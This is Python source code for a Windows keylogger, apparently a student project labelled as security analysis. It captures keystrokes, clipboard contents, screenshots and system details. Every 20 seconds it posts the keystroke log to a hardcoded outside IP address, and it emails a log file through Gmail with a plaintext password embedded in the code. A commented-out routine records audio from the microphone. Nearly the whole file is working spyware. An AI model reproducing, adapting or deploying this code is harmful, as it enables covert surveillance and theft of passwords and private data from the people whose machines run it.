from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

import time
import os

from pynput import keyboard

from scipy.io.wavfile import write
import sounddevice as sd 

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab, Image
import io

import json
import threading
import requests


user_name = getpass.getuser()
file_path = "V:\\GURU\\projects\\Developing a keylogger for sec-analysis\\code" 
#file_path = f"C:\\Users\\{user_name}\\Contacts"
extend = "\\"
file_merge = file_path + extend


email_adderss = "csd.team.8@gmail.com"
password = "csdcteam@08"
toaddr = "csd.team.8@gmail.com"

ip_address = "172.235.173.229"
port_number = "8080"

keys_information = "key_log.txt"
system_info = "sysinfo.txt"
clipboard_info = "clipboard.txt"
clipboaed_image = "clipimg.png"
screenshot_info = "sshot.png"
audio_info = "audio.wav"

microphone_time = 30

text = ""

text_lock = threading.Lock()

time_interval = 20



def generate_key():
    skey = Fernet.generate_key()
    with open("encryption_key.key", "wb") as key_file:
        key_file.write(skey)
generate_key()

def load_key():
    return open("encryption_key.key", "rb").read()
load_key()

def encrypt_file(file_path):
    skey = load_key()
    fernet = Fernet(skey)

    with open(file_path, "rb") as file:
        file_data = file.read()

    encrypted_data = fernet.encrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(encrypted_data)


def send_post_req():
    global text
    try:
        with text_lock:  
            if text.strip():  
                payload = json.dumps({"keyboardData": text})
                headers = {"Content-Type": "application/json"}

                r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers=headers)
                if r.status_code == 200:
                    print("Logs sent successfully.")
                    text = ""  
                else:
                    print("Failed to send logs. Server response: ")

        
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()

    except Exception as e:
        print(f"Couldn't complete request: {e}")

def send_email(filename , attachment , toaddr ) :
    fromaddr = email_adderss

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "log file"

    body = "Body_of_mail"
    msg.attach(MIMEText(body , 'plane'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application' , 'octet-stream')
    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) 
    msg.attach(p) 


    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        server.sendmail(fromaddr, toaddr, msg.as_string())
        server.quit()
        
        print("Email sent successfully")

    except smtplib.SMTPAuthenticationError as e:
        print(f"SMTP Authentication Error: {e}")

    except Exception as e:
        print(f"Failed to send email: {e}")

send_email(keys_information , file_merge + keys_information , toaddr)


def computer_info():
    try:
        with open(file_merge + system_info, "a") as f:
            hostname = socket.gethostname()
            ipaddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("public_ip:" + public_ip + '\n')
            except Exception:
                f.write("Can't get public ip address-(max qureys)" + '\n')
            
            f.write("System :" + platform.system() + '\n')
            f.write("Processor :" + platform.processor() + '\n')
            f.write("Machine :" + platform.machine() + '\n')
            f.write("Hostname :" + hostname + '\n')
            f.write("Private-ip :" + ipaddr + '\n')
    except Exception as e:
        print(f"error : {e}")

computer_info()
encrypt_file(file_merge + system_info)



def clipboard ():
    with open(file_merge + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            copied_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("clipboard info : \n" + copied_data + '\n')
        except:
            f.write("clipboard is empty !!")
clipboard()
encrypt_file(file_merge + clipboard_info)


def clipimg():
    try:
        im = ImageGrab.grabclipboard()
        im.save(file_merge + clipboaed_image)
            
    except Exception as e:
        print("No image found !!")
clipimg()


def screenshot():
    try:
        ss = ImageGrab.grab()
        ss.save( file_merge + screenshot_info)
    except Exception as e:
        print(f"Can't take screen short becoze :{e}")
screenshot()


'''def microphone():
    try:
        fs = 44100
        sec = microphone_time
        recording = sd.rec(int(sec * fs), samplerate = fs , channels = 2 )
        sd.wait()
        write(file_merge + audio_info, fs , recording)
    except Exception as e:
        print(f"error is : {e}")
microphone()'''



def on_press(key):
    global text
    print(key)
    try:
        key_char = ""
        if key == keyboard.Key.enter:
            key_char = "\n"
        elif key == keyboard.Key.tab:
            key_char = "\t"
        elif key == keyboard.Key.space:
            key_char = " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            pass
        elif key == keyboard.Key.esc:
            return False
        else:
            key_char = str(key).replace("'", "")

        with text_lock:  
            text += key_char

    
        with open(file_merge + keys_information, "a") as f:
            f.write(key_char)
        

    except Exception as e:
        print(f"Error capturing key: {e}")



with keyboard.Listener(on_press=on_press) as listener:

    send_post_req()

    listener.join() 




